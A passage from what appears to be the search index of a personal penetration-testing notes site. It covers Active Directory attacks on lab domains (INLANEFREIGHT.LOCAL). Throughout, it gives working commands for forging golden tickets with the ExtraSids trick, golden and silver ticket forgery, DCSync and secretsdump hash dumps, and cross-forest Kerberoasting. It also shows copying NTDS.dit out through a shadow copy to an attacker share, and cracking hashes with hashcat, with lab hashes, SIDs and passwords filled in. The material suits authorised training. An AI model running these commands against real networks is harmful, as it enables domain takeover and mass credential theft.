Trusts","text":""},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#windows","title":"Windows","text":""},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#extrasids-attack-mimikatz","title":"ExtraSids Attack - Mimikatz","text":"<p>This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.</p> <p>To perform this attack after compromising a child domain, we need the following:</p> <ul> <li>The KRBTGT hash for the child domain</li> <li>The SID for the child domain</li> <li>The name of a target user in the child domain (does not need to exist!)</li> <li>The FQDN of the child domain.</li> <li>The SID of the Enterprise Admins group of the root domain.</li> <li>With this data collected, the attack can be performed with Mimikatz. Now we can gather each piece of data required to perform the ExtraSids attack. First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.</li> </ul> <p>Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#obtaining-the-krbtgt-accounts-nt-hash-using-mimikatz","title":"Obtaining the KRBTGT Account's NT Hash using Mimikatz","text":"<pre><code>mimikatz.exe\nmimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#obtaining-enterprise-admins-groups-sid-using-get-domaingroup","title":"Obtaining Enterprise Admins Group's SID using Get-DomainGroup","text":"<pre><code>PS &gt; Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid\n</code></pre> <ul> <li>The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f</li> <li>The SID for the child domain: S-1-5-21-2806153819-209893948-922872689</li> <li>The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: hacker</li> <li>The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL</li> <li>The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519</li> </ul>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#creating-a-golden-ticket-with-mimikatz","title":"Creating a Golden Ticket with Mimikatz","text":"<pre><code>PS &gt; mimikatz.exe\n\nmimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#extrasids-attack-rubeus","title":"ExtraSids Attack - Rubeus","text":"<pre><code>PS &gt;  .\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#performing-a-dcsync-attack","title":"Performing a DCSync Attack","text":"<pre><code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm /domain:INLANEFREIGHT.LOCAL\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#linux","title":"Linux","text":""},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#performing-dcsync-with-secretsdumppy","title":"Performing DCSync with secretsdump.py","text":"<pre><code>$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt\n</code></pre> <p>Next, we can use lookupsid.py from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format DOMAIN_SID-RID. For example, from the output below, we can see that the SID of the lab_adm user would be S-1-5-21-2806153819-209893948-922872689-1001.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#performing-sid-brute-forcing-using-lookupsidpy","title":"Performing SID Brute Forcing using lookupsid.py","text":"<pre><code>$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \n\n$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep \"Domain SID\"\n</code></pre> <p>Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain SID S-1-5-21-3842939050-3880317879-2865463114 and attach the RID of the Enterprise Admins group. Here is a handy list of well-known SIDs.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#grabbing-the-domain-sid-attaching-to-enterprise-admins-rid","title":"Grabbing the Domain SID &amp; Attaching to Enterprise Admin's RID","text":"<pre><code>$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 \"Enterprise Admins\"\n</code></pre> <p>Next, we can use ticketer.py from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by -domain-sid) and the parent domain (specified by -extra-sid).</p> <pre><code>$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker\n</code></pre> <p>The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials. Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#setting-the-krb5ccname-environment-variable","title":"Setting the KRB5CCNAME Environment Variable","text":"<pre><code>$ export KRB5CCNAME=hacker.ccache \n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#getting-a-system-shell-using-impackets-psexecpy","title":"Getting a SYSTEM shell using Impacket's psexec.py","text":"<pre><code>$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#dump-ntlm-hashes","title":"Dump NTLM Hashes","text":"<pre><code>$ secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/AttackingDomainTrustsChildTrusts/#performing-the-attack-with-raisechildpy","title":"Performing the Attack with raiseChild.py","text":"<pre><code>$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm\n</code></pre> <p>Though tools such as raiseChild.py can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool. In a client production environment, we should always be careful when running any sort of \"autopwn\" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an \"autopwn\" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). I would recommend avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/","title":"Attacking Domain Trusts - Cross-Forest Trust Abuse","text":""},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#windows","title":"Windows","text":""},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#cross-forest-kerberoasting","title":"Cross-Forest Kerberoasting","text":"<p>Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.</p> <p>We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#enumerating-accounts-for-associated-spns-using-get-domainuser","title":"Enumerating Accounts for Associated SPNs Using Get-DomainUser","text":"<pre><code>PS &gt; Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#enumerating-the-mssqlsvc-account","title":"Enumerating the mssqlsvc Account","text":"<pre><code>PS &gt; Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof\n</code></pre> <p>Let's perform a Kerberoasting attack across the trust using Rubeus. We run the tool as we did in the Kerberoasting section, but we include the /domain: flag and specify the target domain.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#performing-a-kerberoasting-attacking-with-rubeus-using-domain-flag","title":"Performing a Kerberoasting Attacking with Rubeus Using /domain Flag","text":"<pre><code>PS &gt; .\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap\n</code></pre> <p>We could then run the hash through Hashcat. If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#admin-password-re-use-group-membership","title":"Admin Password Re-Use &amp; Group Membership","text":"<p>From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests. I occasionally ran into issues where, for example, Domain A would have a user named adm_bob.smith in the Domain Admins group, and Domain B had a user named bsmith_admin. Sometimes, the user would be using the same password in the two domains, and owning Domain A instantly gave me full admin rights to Domain B.</p> <p>We may also see users or admins from Domain A as members of a group in Domain B. Only Domain Local Groups allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.</p> <p>We can use the PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain, also known as foreign group membership. Let's try this against the FREIGHTLOGISTICS.LOCAL domain with which we have an external bidirectional forest trust.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#using-get-domainforeigngroupmember","title":"Using Get-DomainForeignGroupMember","text":"<pre><code>PS &gt; Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL\nPS &gt; Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#accessing-dc03-using-enter-pssession","title":"Accessing DC03 Using Enter-PSSession","text":"<pre><code>PS &gt; Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\\administrator\n</code></pre> <p>From the command output above, we can see that we successfully authenticated to the Domain Controller in the FREIGHTLOGISTICS.LOCAL domain using the Administrator account from the INLANEFREIGHT.LOCAL domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#linux","title":"Linux","text":"<p>If this is possible in the environment we are assessing, we can perform this with GetUserSPNs.py from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the -target-domain flag in our command. Performing this against the FREIGHTLOGISTICS.LOCAL domain, we see one SPN entry for the mssqlsvc account.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#cross-forest-kerberoasting_1","title":"Cross-Forest Kerberoasting","text":""},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#using-getuserspnspy","title":"Using GetUserSPNs.py","text":"<pre><code>$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley\n</code></pre> <p>transporter@4 Rerunning the command with the -request flag added gives us the TGS ticket. We could also add -outputfile  to output directly into a file that we could then turn around and run Hashcat against."},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#using-the-request-flag","title":"Using the -request Flag","text":"<pre><code>$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  \n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#hunting-foreign-group-membership-with-bloodhound-python","title":"Hunting Foreign Group Membership with Bloodhound-python","text":"<p>As noted in the last section, we may, from time to time, see users or admins from one domain as members of a group in another domain. Since only Domain Local Groups allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship. If we are testing from a Linux host, we can gather this information by using the Python implementation of BloodHound. We can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.</p> <p>On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our resolv.conf file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of ACADEMY-EA-DC01 as the nameserver.</p> <pre><code>$ cat /etc/resolv.conf \n\ndomain INLANEFREIGHT.LOCAL\nnameserver 172.16.5.5\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#connect-to","title":"Connect to","text":"<pre><code>psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local -target-ip 172.16.5.238\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#running-bloodhound-python-against-inlanefreightlocal","title":"Running bloodhound-python Against INLANEFREIGHT.LOCAL","text":"<pre><code>$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#compressing-the-file-with-zip-r","title":"Compressing the File with zip -r","text":"<pre><code>$ zip -r ilfreight_bh.zip *.json\n</code></pre> <p>We will repeat the same process, this time filling in the details for the FREIGHTLOGISTICS.LOCAL domain.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#adding-freightlogisticslocal-information-to-etcresolvconf","title":"Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf","text":"<pre><code>$ cat /etc/resolv.conf \n\ndomain FREIGHTLOGISTICS.LOCAL\nnameserver 172.16.5.238\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/CrossForestTrustAbuse/#running-bloodhound-python-against-freightlogisticslocal","title":"Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL","text":"<pre><code>$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2\n</code></pre> <p>After uploading the second set of data (either each JSON file or as one zip file), we can click on Users with Foreign Domain Group Membership under the Analysis tab and select the source domain as INLANEFREIGHT.LOCAL. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/DomainTrusts/","title":"Domain Trusts","text":""},{"location":"zNew/ActiveDirectory/08-TrustRelationship/DomainTrusts/#enumerating-trust-relationships","title":"Enumerating Trust Relationships","text":""},{"location":"zNew/ActiveDirectory/08-TrustRelationship/DomainTrusts/#using-get-adtrust","title":"Using Get-ADTrust","text":"<pre><code>PS &gt; Import-Module activedirectory\nPS &gt; Get-ADTrust -Filter *\n</code></pre> <p>Aside from using built-in AD tools such as the Active Directory PowerShell module, both PowerView and BloodHound can be utilized to enumerate trust relationships, the type of trusts established, and the authentication flow. After importing PowerView, we can use the Get-DomainTrust function to enumerate what trusts exist, if any.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/DomainTrusts/#checking-for-existing-trusts-using-get-domaintrust","title":"Checking for Existing Trusts using Get-DomainTrust","text":"<pre><code>PS &gt; Get-DomainTrust \n</code></pre> <p>PowerView can be used to perform a domain trust mapping and provide information such as the type of trust (parent/child, external, forest) and the direction of the trust (one-way or bidirectional). This information is beneficial once a foothold is obtained, and we plan to compromise the environment further.</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/DomainTrusts/#using-get-domaintrustmapping","title":"Using Get-DomainTrustMapping","text":"<pre><code>PS &gt; Get-DomainTrustMapping\n</code></pre> <p>From here, we could begin performing enumeration across the trusts. For example, we could look at all users in the child domain:</p>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/DomainTrusts/#checking-users-in-the-child-domain-using-get-domainuser","title":"Checking Users in the Child Domain using Get-DomainUser","text":"<pre><code>PS &gt; Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/DomainTrusts/#using-netdom-to-query-domain-trust","title":"Using netdom to query domain trust","text":"<pre><code>&gt; netdom query /domain:inlanefreight.local trust\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/DomainTrusts/#using-netdom-to-query-domain-controllers","title":"Using netdom to query domain controllers","text":"<pre><code>&gt; netdom query /domain:inlanefreight.local dc\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/DomainTrusts/#using-netdom-to-query-workstations-and-servers","title":"Using netdom to query workstations and servers","text":"<pre><code>&gt; netdom query /domain:inlanefreight.local workstation\n</code></pre>"},{"location":"zNew/ActiveDirectory/08-TrustRelationship/DomainTrusts/#visualizing-trust-relationships-in-bloodhound","title":"Visualizing Trust Relationships in BloodHound","text":"<p>We can also use BloodHound to visualize these trust relationships by using the Map Domain Trusts pre-built query. Here we can easily see that two bidirectional trusts exist.</p>"},{"location":"zNew/ActiveDirectory/09-DomainAdmin/DumpNTDS.dit/","title":"Dump NTDS.dit","text":"<p>In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.</p> <p>Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389) or other protocols used for remote access on their edge router to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let's consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.</p> <p>Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device proceeded by the Username (Example: WS01/nameofuser) or with direct access to the device then typing ./ at the logon UI in the Username field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this technique.</p>"},{"location":"zNew/ActiveDirectory/09-DomainAdmin/DumpNTDS.dit/#capturing-ntdsdit","title":"Capturing NTDS.dit","text":"<p>NT Directory Services (NTDS) is the directory service used with AD to find &amp; organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.</p> <p>We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.</p>"},{"location":"zNew/ActiveDirectory/09-DomainAdmin/DumpNTDS.dit/#checking-user-account-privileges-including-domain","title":"Checking User Account Privileges including Domain","text":"<ul> <li><code>net user bwilliamson</code></li> </ul>"},{"location":"zNew/ActiveDirectory/09-DomainAdmin/DumpNTDS.dit/#creating-shadow-copy-of-c","title":"Creating Shadow Copy of C:","text":"<p>We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read &amp; written to actively without needing to bring a particular application or system down. VSS is used by many different backup &amp; disaster recovery software to perform operations.</p> <ul> <li><code>vssadmin CREATE SHADOW /For=C:</code></li> </ul>"},{"location":"zNew/ActiveDirectory/09-DomainAdmin/DumpNTDS.dit/#copying-ntdsdit-from-the-vss","title":"Copying NTDS.dit from the VSS","text":"<p>We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.</p> <ul> <li><code>cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit</code></li> </ul>"},{"location":"zNew/ActiveDirectory/09-DomainAdmin/DumpNTDS.dit/#transferring-ntdsdit-to-attack-host","title":"Transferring NTDS.dit to Attack Host","text":"<p>Now cmd.exe /c move can be used to move the file from the target DC to the share on our attack host. - <code>cmd.exe /c move C:\\NTDS\\NTDS.dit \\\\10.10.15.30\\CompData</code></p>"},{"location":"zNew/ActiveDirectory/09-DomainAdmin/DumpNTDS.dit/#crackmapexec","title":"CrackMapExec","text":"<p>Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.</p> <pre><code>$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds\n</code></pre>"},{"location":"zNew/ActiveDirectory/09-DomainAdmin/DumpNTDS.dit/#impacket","title":"Impacket","text":"<pre><code>$ secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; \n</code></pre>"},{"location":"zNew/ActiveDirectory/09-DomainAdmin/DumpNTDS.dit/#cracking-hashes-gaining-credentials","title":"Cracking Hashes &amp; Gaining Credentials","text":"<p>We can proceed with creating a text file containing all the NT hashes, or we can individually copy &amp; paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.</p> <ul> <li><code>sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</code></li> </ul>"},{"location":"zNew/ActiveDirectory/10-Persistence/GoldTicket/","title":"GoldTicket","text":"<ul> <li>https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden </li> <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket</li> </ul>"},{"location":"zNew/ActiveDirectory/10-Persistence/GoldTicket/#windows","title":"Windows","text":""},{"location":"zNew/ActiveDirectory/10-Persistence/GoldTicket/#mimikatz","title":"Mimikatz","text":"<pre><code># with an NT hash\nkerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt\n\n# with an AES 128 key\nkerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt\n\n# with an AES 256 key\nkerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt\n</code></pre>"},{"location":"zNew/ActiveDirectory/10-Persistence/GoldTicket/#rubeus","title":"Rubeus","text":"<pre><code>.\\Rubeus.exe ptt /ticket:ticket.kirbi\n</code></pre>"},{"location":"zNew/ActiveDirectory/10-Persistence/GoldTicket/#remote","title":"Remote","text":"<pre><code>$ import-module .\\PowerView.ps1\n$ Get-DomainSID\n</code></pre> <pre><code># Create the golden ticket (with an RC4 key, i.e. NT hash)\n$ ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser\n\n# Create the golden ticket (with an AES 128/256bits key)\n$ ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser\n</code></pre>"},{"location":"zNew/ActiveDirectory/10-Persistence/SilverTicket/","title":"SilverTicket","text":"<ul> <li>https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver</li> <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</li> </ul> <p>The Silver Ticket attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.</p>"},{"location":"zNew/ActiveDirectory/10-Persistence/SilverTicket/#generate-the-rc4-hash-from-password","title":"Generate the RC4 hash from password","text":"<pre><code>&gt; mimikatz.exe\n&gt; kerberos::hash /password:MyPassword\n</code></pre>"},{"location":"zNew/ActiveDirectory/10-Persistence/SilverTicket/#windows","title":"Windows","text":""},{"location":"zNew/ActiveDirectory/10-Persistence/SilverTicket/#mimikatz","title":"Mimikatz","text":"<pre><code># To generate the TGS with NTLM\n&gt; mimikatz # kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /rc4:&lt;ntlm_hash&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;\n\n# To generate the TGS with AES 128 key\n&gt; mimikatz # kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;\n\n# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)\n&gt; mimikatz # kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt; \n\n# Inject TGS with Mimikatz\n&gt; mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/10-Persistence/SilverTicket/#rubeus","title":"Rubeus","text":"<pre><code>&gt; .\\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/10-Persistence/SilverTicket/#remote","title":"Remote","text":"<pre><code>$ ticketer.py -nthash $NTLM -domain-sid $DOMAIN_SID -domain $DOMAIN &lt;USER&gt;\n\n# To generate the TGS with NTLM\n$ python ticketer.py -nthash &lt;ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;\n\n# To generate the TGS with AES key\n$ python ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;\n\n# Set the ticket for impacket use\n$ export KRB5CCNAME=&lt;TGS_ccache_file&gt;\n\n# Execute remote commands with any of the following by using the TGT\n$ python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/","title":"BruteForce","text":""},{"location":"zNew/BruteForce/BruteForce/#delete","title":"delete","text":""},{"location":"zNew/BruteForce/BruteForce/#passwords-attack","title":"Passwords Attack","text":""},{"location":"zNew/BruteForce/BruteForce/#hash-identifier","title":"Hash Identifier","text":"<pre><code>$ hash-identifier\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#crack-password","title":"Crack 